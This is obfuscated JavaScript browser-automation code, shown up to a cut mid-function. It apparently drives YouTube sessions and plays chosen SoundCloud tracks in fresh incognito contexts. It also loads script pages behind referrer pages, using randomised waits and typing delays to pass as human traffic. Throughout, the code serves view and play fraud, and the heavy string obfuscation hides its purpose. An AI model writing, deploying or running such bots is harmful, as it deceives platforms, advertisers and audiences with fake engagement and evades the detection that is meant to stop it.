const Z = c,
  Y = d,
  X = b;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x12f5 + -0x98e + -0x966))) + i;
}
async function createPage(f, h) {
  const R = d;
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](-0x9ad + 0x1a8d + 0xb4 * -0x18), await i['goto'](h, {
    'waitUntil': [R(0x0) + 'loaded'],
    'timeout': 0x0
  }), i;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (-0x13ab + 0xb2b * 0x3 + -0xdd6);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(0xaa17 * 0x1 + 0xac5b + -0x1017 * 0xe + (0xeb6 + 0x4859 * -0x1 + 0x743b) * random()) : await standardWaitForNetIdle(f), await wait(-0x195c + 0xeed * 0x2 + 0xf0a + (0x4a * 0xc5 + -0x149 * -0x13 + -0x2a4d * 0x1) * random()), 0x539 * -0x7 + 0x1ced + -0x17 * -0x55;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x3 * 0xb2d + -0x10f * 0x1f + 0x55e0), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), 0x1 * -0x106e + 0xa75 * -0x3 + 0x2fce;
}
async function randomWait() {
  return await wait(-0x1 * 0xf93 + 0x14cb * 0x1 + 0xe50 + (0x50d + 0x1798 + -0x91d) * random()), 0xc * -0x71 + -0x2616 + 0x1 * 0x2b63;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x1a * 0x125 + -0x68c + 0x1 * -0x1736, -0x20ec + -0x1d2f + 0xa5b * 0x6), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((-0x13336 + 0x1a590 + 0x7806) * getRandomInt(0x2f5 * 0x3 + 0x1e03 + -0x9b8 * 0x4, 0xf06 + 0xc5 * 0x8 + 0x1529 * -0x1), h)), 0xe03 * 0x2 + -0x199 * 0x13 + 0x256;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0x1aef + -0xd * -0x39 + 0x22 * 0xb5;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[-0x709 + 0x2 * 0x199 + 0xa4 * 0x6]['split']('\x20');
    for (let k = -0x22d * 0x5 + -0x20ef + 0xaf4 * 0x4; k < i['length']; k += 0x2 * -0xa49 + -0x2572 + 0x2 * 0x1d03)
      j += i[k] * h[i[k + (0xee7 + -0x8e * -0x2e + 0x5c6 * -0x7)]];
    return j;
  });
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](0x1f08 + 0x67f + 0x1 * -0x2581)['map'](l => Array['from'](l['children']))['flat'](-0x13 * -0xdd + -0x1 * -0xc47 + -0x1cad * 0x1)['map'](l => l['childNodes'][-0x1dca + 0x6 * 0x12f + -0x25 * -0x9d]['childNodes'][-0x2475 * 0x1 + -0x2433 + 0x48a8]['childNodes'][-0x1687 + 0x1 * 0x24d4 + -0x4c4 * 0x3]['childNodes'][-0x40 * 0x5d + 0xe93 + -0x8ad * -0x1]['childNodes'][-0x2 * 0x6da + 0x1f0e + 0x1159 * -0x1]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0x1c13 * 0x1 + 0x638 + -0x1e63, 0x2 * -0x43c + -0x17 * -0x1b + 0x1993)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0xd * 0xfa + 0x97d * -0x3 + -0x4a5d * -0x1);
  const h = await getMaxTime(f),
    i = Math['min']((-0x1c5b1 + -0x10db4 + 0x3bdc5) * getRandomInt(-0x1 * -0x4a9 + -0x222d * -0x1 + -0x8c * 0x47, 0x4 * 0x50e + -0x2 * 0x397 + -0xd05), h);
  return await wait(i), 0x2629 + -0x3e4 + -0x2244;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][0x79b + 0x22c4 + -0x1 * 0x2a5f]['children'][0x8f + -0x1fc * 0xc + 0x1741]['children'][0x7 * 0xe5 + 0x1 * -0xb05 + -0x2a * -0x1d]['children'][0x11b1 + -0x31 * 0x81 + 0xe * 0x80]['children'][0x12 * 0x1e3 + -0xf * 0x1a6 + -0x93c]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), -0x130d + 0x1 * 0x16ed + -0x3df;
}
async function searchAndView(f) {
  const S = d;
  log(S(0x6) + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    const T = c;
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k[T(0x15)])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': 0x1f5 * -0x2 + -0x55 * -0x47 + -0x1 * 0x1345 + (-0x12a6 + 0x1c10 + -0x938) * random()
  }), await wait(-0x29 * -0x2c + 0x1af * -0x4 + -0x46 * -0x6 + (0x1 * 0x12f6 + 0x17e7 + -0x29b1 * 0x1) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x3ee + 0x8e9 * 0x3 + -0xf * 0x185]['childNodes'][0x29 * 0xb6 + 0x41f * -0x1 + -0x1906]['childNodes'][0x187f + -0x33 * 0x43 + -0x3 * 0x3b7]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x427 * 0x2 + -0x13 * 0x13d + -0xf3e * -0x1]['childNodes'][-0x878 + -0x2 * 0xfc3 + 0x27fe]['childNodes'][-0x6b * 0x18 + -0x12c * -0x4 + 0x55a]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x24e3 * -0x1 + 0x223d + -0x471f),
          r = -0x10 * -0x1f3 + -0x1bb9 + -0x377;
        for (let u = 0x2222 + 0xeae + 0x8e * -0x58; u < q['length']; u += 0xb * 0x226 + -0x1a36 + 0x296)
          r += q[u] * k[q[u + (-0x1 * 0x10b9 + -0x2 * 0x353 + 0x110 * 0x16)]];
        return r;
      }(n);
  });
  await wait((0x492f + -0x37ed + 0x1e1 * 0x16) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((-0x19 * -0x57f + 0x1a0 * 0x111 + -0x1 * 0x15aa7) * getRandomInt(-0x441 + -0x1 * -0x14bd + 0x107b * -0x1, -0xb56 + 0xbc * -0x2e + -0x2 * -0x1694), h + (-0xe18 + 0x200c + -0x194 * -0x1));
  return await wait(i), 0x1bf9 + 0x185f + -0x1 * 0x3457;
}
async function keyWatch(f) {
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x2d2 * 0xc + 0x132d + -0x3505), log('clicking..' + '.'), await f['click']('#button\x20>\x20' + 'ytd-button' + '-renderer\x20' + '>\x20yt-butto' + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, 0xe10 + 0xf1b * -0x1 + 0xcc3 + (0x234 * -0x5 + -0x1 * 0x2347 + -0xb5 * -0x47) * Math['random']());
    });
  }, -0x2539 * 0x1 + 0x2025 + 0x206c);
  await wait(0x6eb8b * -0x1 + 0x6 * -0x2cc7 + -0x1 * -0xc8c15);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((0x1 * -0x1a057 + -0x1 * 0x91cf + 0x31c86) * getRandomInt(-0xa * 0x2c3 + -0x1b79 + 0x371b, -0x26b6 + 0x1 * 0x1400 + 0x2d * 0x6b)), clearInterval(h), 0x1ae4 + -0x8 * -0x19d + -0x27cb;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0x2 * -0x6de + -0x1bde + 0x299a;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0x7b + 0x3 * -0x3e5 + -0x1 * -0xc2b;
    await randomWait();
  }
  return -0x2ce + 0x86d * -0x1 + 0xb3c;
}

function a() {
  const bo = [
    'domcontent',
    'ChrZl2j5lxnPDa',
    's2L0lZuZnY4ZnG',
    'script-opt',
    'kCoBWRikWRdcRCowdtFdHW',
    'zgLNzxn0',
    'searching\x20',
    'wWkviY8zBr',
    'CMCVzw4VC2nYAq',
    'WRmLja',
    'zw51C2vYANmUBW',
    'WP7dVCo7FmkkkaaCWQxcJq',
    'idu.com/',
    'p8o6x8odWRZcHCk/pSo5Eq',
    'uafGOfwzpa',
    'close',
    'zMfYAs81mZCUmW',
    'rg/en/scri',
    'f0XkbgBdMmoIg1JdPW',
    'W7CHW6VcVmkOELpcSdy4',
    'youtube-no',
    'DgfNtMfTzq',
    'ofHRy2jKu1jKtW',
    'WPddTSomq8kBeaS6W7RcHG',
    'w8ozW63dO8kUWO3cSHxdP34',
    'W77cQJ0qhmoKxSkihWK',
    'yMXVy2TZ',
    'F7i7wRlGCd',
    'ecko)\x20Chro',
    '28\x20Mobile\x20'
  ];
  a = function() {
    return bo;
  };
  return a();
}

function fetchRandomSC() {
  const U = b;
  return Math['random']() <= -0x15a * -0xd + 0x1 * -0xae1 + -0x6b1 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + 'y-beats?si' + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < -0x15ea + -0x1617 + -0x3 * -0xeab + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + U(0x17, 'qSgc') + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0xba8 + -0xb09 * -0x3 + -0x1 * 0x2cc3 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = 0x126a + 0x1c17 + 0x1 * -0x2e81;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x9dbc + -0x1352d + -0x1 * -0x14739 + getRandomInt(-0xc48 + -0x31a * -0x1a + -0x9c4, -0x56e9 + 0x7b5 * 0x2 + 0xbcaf));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x1 * 0x2546 + 0x1893 + -0x3dd8), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = -0x4d * -0x36 + -0x217b + 0x113d;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
      return log(v['slice'](0x7 * -0x283 + -0x1a38 + 0x1 * 0x2bcd, 0x1c69 + -0x53c * -0x2 + -0x26af)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, -0xfa4 + 0x1ef5 + -0x781 + floor((-0x650 + 0x1ac2 + 0x3a * -0x49) * random()))), log('p2'), log(await s['evaluate'](() => {
        const W = c;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0xe * 0xab5c126 + -0x13 * -0xadf970e + 0x43 * 0x1109a2e),
          -0x629475 + -0xb6d11c + -0x51e11d * -0x5,
          0xd990 + 0xdcbb + -0x1364b,
          -0x388 + 0xaf2 + -0x6ea
        ], y = [
          -0x1a * 0x151 + 0x20f7 + -0x15b * -0x1,
          0xb7f + 0x769 + -0x12d8,
          -0x2682 + -0xa4e * -0x2 + 0x11ee,
          0x3df * 0xa + -0x1 * 0x47b + -0x7f * 0x45
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(-0x238b + -0xda * -0x1c + 0xbb4)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = -0x1278 + -0x99e + 0x2 * 0xe0b; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0xa7b + -0x1936 + 0x23b1) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x5 * -0xce + 0x239f * -0x1 + 0x1f99] = A[0x1f * -0x14 + -0xc * -0x145 + 0x330 * -0x4] = A[0x926 * -0x3 + 0x418 + -0x3 * -0x7c9] = A[0x1a82 + -0x2fd + -0x1 * 0x1783] = A[-0x1843 + 0x20 * 0x3a + 0x1106] = A[0x1 * -0x58c + -0x15b7 + 0x1b47 * 0x1] = A[0x2226 + -0x88d + 0xcca * -0x2] = A[0x164d + 0x24e0 * -0x1 + 0xe99] = A[0x1d6e + 0x2 * -0x8d7 + -0xbb9 * 0x1] = A[-0x696 + 0x15ef + -0xf51 * 0x1] = A[0x1f4e + 0x92 * -0x15 + -0x134b] = A[-0xd7d + 0x8 * 0x220 + -0x379] = A[0x1376 + -0x13ea + 0x1 * 0x7f] = A[0x6 * 0x364 + 0x2654 + -0x3aa0] = A[0x2545 + 0x1215 * 0x1 + -0x374d] = A[-0x5eb + 0x10f * -0x1 + 0x708] = A[0x8f * 0x27 + -0x1344 + -0x23 * 0x12] = 0x3 * -0x385 + 0x1 * 0xdd3 + -0x344, this['blocks'] = A) : this['blocks'] = [
                -0x9c0 + 0x1197 + -0x7d7,
                -0x1882 + -0x66 * 0x3 + 0x19b4,
                0xc11 * -0x1 + 0x185 + -0x96 * -0x12,
                -0x4 * 0x1e8 + -0x28 + 0x7c8,
                -0x12a * -0x1a + -0x1 * -0x401 + -0x2245,
                0x3a * -0x5 + 0x13cd * -0x1 + 0x14ef,
                0x1713 + 0x7bd * 0x3 + -0x2e4a,
                -0x22e6 + -0x57 * -0x3f + 0xd7d,
                -0x9 * -0x2a9 + 0x754 * -0x4 + -0x5 * -0x113,
                -0x8d + 0x840 + -0x7b3,
                -0x1151 + -0x14 * 0x106 + 0x25c9,
                -0x5e4 + 0xb76 + -0x3e * 0x17,
                0x1a59 + -0x131 * 0x3 + 0x1 * -0x16c6,
                0x1 * 0xb57 + 0x3f0 + 0x1 * -0xf47,
                0x1f6 + 0x2488 + 0x17b * -0x1a,
                0x1f45 + 0x171b + -0x3660,
                0x1b77 + -0x18d * -0x5 + -0x508 * 0x7
              ], this['h0'] = 0x5b96e185 * -0x2 + 0xd068d2c * -0xd + 0x7 * 0x411c94c1, this['h1'] = 0x1a7f946bb + -0x46b6b9 * 0x6b5 + 0x1221beb9b, this['h2'] = 0xedb66cff + 0xed3a7307 + 0xa9b96c * -0x1e6, this['h3'] = -0x189b5688 + -0x12f7c8bb + 0x3bc573b9, this['h4'] = -0x17f7f95 * 0xb3 + 0x1564f301a + -0x79a9e705 * -0x1, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x1bdc + 0xc8c + 0xf50, this['finalized'] = this['hashed'] = 0x72f + -0xfbb + 0x1 * 0x88c, this['first'] = -0x1395 + 0x15c1 + -0x22b;
            }
            ['update'](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = -0x1 * 0x749 + 0x14 * -0x2f + -0xff * -0xb, O = J['length'] || 0x1 * 0x1809 + 0x18c + -0xb1 * 0x25, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x6 * -0xe9 + -0xa * -0x2b + 0x3c8, P[-0x35 * 0xb3 + 0x3d8 + 0x2137 * 0x1] = this['block'], P[0x158d + -0x85 * 0x17 + -0x98a] = P[-0x1ef2 + 0x15e4 + -0x90f * -0x1] = P[0x5 * 0x456 + -0x2501 + 0x5 * 0x311] = P[-0x21a8 + 0x1d47 + 0x4 * 0x119] = P[-0x1 * 0x1a89 + 0x23e9 * -0x1 + 0x3e76] = P[-0x1 * 0x240b + -0xde4 + 0x31f4] = P[-0x1f0d + 0xb * -0x12e + 0x2c0d] = P[0x2fc + 0x1957 + -0x1c4c * 0x1] = P[-0x216b * 0x1 + -0x1b34 + 0x3ca7 * 0x1] = P[-0x2 * -0x977 + -0x1 * -0x137 + -0x6b4 * 0x3] = P[-0x37 * -0xb2 + -0x3 * -0xb1b + -0x17d7 * 0x3] = P[0x1cd8 + -0x1fb0 + -0x2e3 * -0x1] = P[0x3 * -0xbfa + -0x1 * 0x85d + 0x2c57] = P[-0x119b * -0x1 + -0x1 * 0xc42 + -0x54c] = P[-0xf * 0x3 + 0x41 + -0x6] = P[-0x201e + 0x4 * -0x97c + 0x461d] = 0x1eb8 + 0x13dd + -0x17 * 0x233), K) {
                    for (N = this['start']; M < O && N < -0x29 * 0x76 + 0xb2 * 0x8 + 0xd96; ++M)
                      P[N >> 0xa3d * 0x1 + 0xa * 0x2e1 + -0x2705] |= J[M] << y[-0xc98 + 0x7 * 0x2bd + -0x690 & N++];
                  } else {
                    for (N = this['start']; M < O && N < -0x1b * 0x15 + -0xdc6 * -0x1 + -0x243 * 0x5; ++M)
                      (L = J['charCodeAt'](M)) < -0x43 * -0x61 + 0x1 * -0x254f + 0xc6c ? P[N >> -0x3 * -0xc23 + -0x17c2 * 0x1 + -0x53 * 0x27] |= L << y[0x1 * 0x224b + -0x1 * 0x1375 + 0x5 * -0x2f7 & N++] : L < -0x281 * 0x2 + 0x95 * 0x28 + -0xa46 * 0x1 ? (P[N >> -0x7b9 + 0xd39 * 0x1 + -0x57e * 0x1] |= (-0x30b * -0xb + -0xc6c + -0x144d * 0x1 | L >> 0x23ef + 0x10a3 + 0xe4 * -0x3b) << y[-0x277 * 0x7 + -0xbf6 * -0x2 + -0x6a8 & N++], P[N >> 0xbdd * 0x2 + -0x49 * -0x83 + -0x3d13] |= (0x10d * 0x20 + 0xf85 + -0x3 * 0x1037 | 0xacb + -0x97b * -0x1 + -0x6ad * 0x3 & L) << y[0x121 * 0x1 + 0x26f + -0x38d * 0x1 & N++]) : L < -0x138aa + -0x36ed + -0x24797 * -0x1 || L >= 0x823e * 0x3 + 0x4898 + -0xef52 ? (P[N >> -0x1 * 0x16d9 + -0x1 * 0x943 + 0x201e] |= (0x76 * 0x3b + -0x981 * 0x3 + 0xbb * 0x3 | L >> 0x6e * 0x16 + 0x1471 + 0x1b * -0x11b) << y[-0x1397 + -0x1 * -0x1ec7 + -0xb2d & N++], P[N >> 0x10f2 + -0x20fa + 0x100a] |= (0x1a9e + -0x173b + -0x2e3 * 0x1 | L >> -0x131c + -0x7b1 + -0x7 * -0x3d5 & 0xc4 * 0x19 + -0x1 * -0x14b + -0x1430) << y[-0xf9c + -0xa * 0x8e + 0x152b & N++], P[N >> 0x11 * -0x1a9 + 0x68e + 0x1f * 0xb3] |= (0x36f + 0xa22 * 0x2 + -0x1733 | 0xd7d + 0xdf * -0x10 + 0x59 * 0x2 & L) << y[-0xa * -0x2c2 + 0x21af + 0x3d40 * -0x1 & N++]) : (L = -0xb7cf + 0x1 * -0x5006 + 0x207d5 + ((-0x155d + -0x1379 + -0x17 * -0x1f3 & L) << 0x2 * 0x942 + 0x1526 + -0x27a0 | -0xa77 + -0x1002 + 0x1e78 & J['charCodeAt'](++M)), P[N >> 0x1486 + 0x2 * 0x1297 + 0x7 * -0x83e] |= (-0x1e38 + 0x43 * -0x83 + -0x5f3 * -0xb | L >> 0x188b * -0x1 + 0xd * -0x44 + 0x3 * 0x95b) << y[-0x412 + -0x252 * -0x6 + -0x9d7 & N++], P[N >> 0x1 * 0x451 + 0x2fa + -0x749] |= (0x139 * 0x14 + 0x152e + -0x2d22 | L >> -0x1c27 + 0x172b * -0x1 + 0x335e & -0x1126 + -0x1e * -0xfe + -0x1 * 0xc5f) << y[0x1 * -0x12d3 + 0x143d + 0x1 * -0x167 & N++], P[N >> -0x239f * -0x1 + -0x10 * -0x30 + 0x5 * -0x7b9] |= (-0xec3 + 0x905 * 0x2 + -0x1 * 0x2c7 | L >> 0x1c77 * 0x1 + -0x60b + -0x1666 & 0x1835 + -0xafb + -0xcfb * 0x1) << y[-0x839 * 0x1 + 0x3a6 * 0x4 + 0x2c * -0x25 & N++], P[N >> -0x1 * 0x1637 + -0x12c4 + 0x5db * 0x7] |= (0x5 * 0x38 + -0x1de + 0x146 | -0x1 * 0x1f1f + -0x5 * -0x592 + 0x384 & L) << y[0x352 + 0x446 * 0x3 + -0x1 * 0x1021 & N++]);
                  }
                  this['lastByteIn' + 'dex'] = N, this['bytes'] += N - this['start'], N >= 0x18f4 + -0x1 * 0x15f7 + -0x1 * 0x2bd ? (this['block'] = P[0x1 * -0xcf + -0x248d + 0x256c], this['start'] = N - (-0x20de + -0x93a + 0x2a58), this['hash'](), this['hashed'] = 0x513 * 0x7 + -0x33d * 0x1 + 0x2047 * -0x1) : this['start'] = N;
                }
                return this['bytes'] > 0x5ef5dad0 + -0x915e9 * 0x230f + 0x1df9148d6 && (this['hBytes'] += this['bytes'] / (0xd49e977c + 0x170782524 + -0x10412308 * 0x14) << 0x1de * -0x1 + -0x86e + 0x526 * 0x2, this['bytes'] = this['bytes'] % (0xb43004c4 + -0x1605e5264 + -0x2 * -0xd61726d0)), this;
              }
            }
            ['finalize']() {
              if (!this['finalized']) {
                this['finalized'] = 0x2155 + -0xbba + -0x159a;
                var J = this['blocks'],
                  K = this['lastByteIn' + 'dex'];
                J[0x283 * 0xb + 0x1 * 0x257b + -0x410c] = this['block'], J[K >> 0x399 + 0x3 * -0x853 + 0x1562] |= x[0x3 * 0x2e1 + 0x2 * -0xa5d + 0xc1a * 0x1 & K], this['block'] = J[0x1ce9 + -0x110 * -0x14 + -0xab * 0x4b], K >= 0x2468 + -0x35f * -0x1 + -0x278f && (this['hashed'] || this['hash'](), J[0x2 * 0xa11 + -0x1 * -0xc50 + -0x2072] = this['block'], J[0x13 * 0x31 + -0x23fa + 0x2067] = J[0x1319 * 0x1 + 0x23ed + -0x3705] = J[-0x1a20 + -0x3f6 * 0x2 + -0x220e * -0x1] = J[0x23d5 + 0x47 * -0x4a + -0xf4c] = J[-0x61f * 0x1 + -0x15e + 0x781] = J[0xff3 + -0x5 * -0x463 + 0x1 * -0x25dd] = J[0x816 + 0x18e8 + -0x20f8] = J[-0x1c70 + -0x19fd * -0x1 + 0x27a] = J[-0x20e6 * -0x1 + -0x1981 + 0x179 * -0x5] = J[-0x2044 + 0xd37 + 0x1316] = J[-0x2235 + 0x8d8 * -0x4 + 0x1c9 * 0x27] = J[-0x5e3 + -0x1a27 + 0x2015] = J[-0x2544 + 0xbd * 0x1f + 0x3 * 0x4cf] = J[0x331 * 0xb + -0x1 * 0x2029 + -0xf7 * 0x3] = J[0x1b4 * -0xb + 0x71 * -0x3d + 0x8d * 0x53] = J[-0x64f * -0x3 + -0x9da + -0x2 * 0x482] = 0x2 * 0x1346 + 0x1 * 0x18c3 + -0x3f4f), J[0x1b25 + -0x2131 + 0x8e * 0xb] = this['hBytes'] << 0x4 * -0x99c + 0x1367 * -0x1 + -0xb92 * -0x5 | this['bytes'] >>> -0x3b * -0x42 + -0x8e * -0x29 + -0x25d7, J[-0x11 * 0x199 + 0x69 + 0x1acf] = this['bytes'] << -0x954 + 0x53 * -0x65 + -0x1 * -0x2a16, this['hash']();
              }
            }
            ['hash']() {
              const V = c;
              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this[V(0x1a)];
              for (J = -0x61 * 0x31 + -0x8cd * -0x3 + -0x7c6; J < -0x7a * 0xd + 0x1 * 0x108c + -0x2 * 0x505; ++J)
